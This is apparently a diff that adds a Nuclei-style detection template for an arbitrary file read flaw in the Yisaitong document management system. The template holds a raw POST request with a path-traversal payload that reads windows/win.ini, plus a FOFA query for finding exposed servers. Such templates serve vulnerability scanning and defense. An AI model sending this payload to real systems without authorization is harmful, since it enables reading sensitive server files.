@@ -1,0 +1,38 @@
+http:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - bit app support
+    - fonts
+    - extensions
+  matchers-condition: and
+  raw:
+  - 'POST /CDGServer3/downloadfromfile HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    fileName=../../../../../../../../../../../windows/win.ini
+
+    '
+id: yisaitong-downloadfromfile-lfi
+info:
+  author: Co5mos
+  description: 'The yisaitong Document Management System is vulnerable to arbitrary
+    file read through the `downloadfromfile` endpoint, which allows an attacker to
+    read sensitive files from the server.
+
+    '
+  metadata:
+    fofa-query: body="/CDGServer3/index.jsp"
+  name: "\u4EBF\u8D5B\u901A\u7535\u5B50\u6587\u6863\u5B89\u5168\u7BA1\u7406\u7CFB\u7EDF\
+    downloadfromfile\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E"
+  severity: high
+  tags: lfi,yisaitong
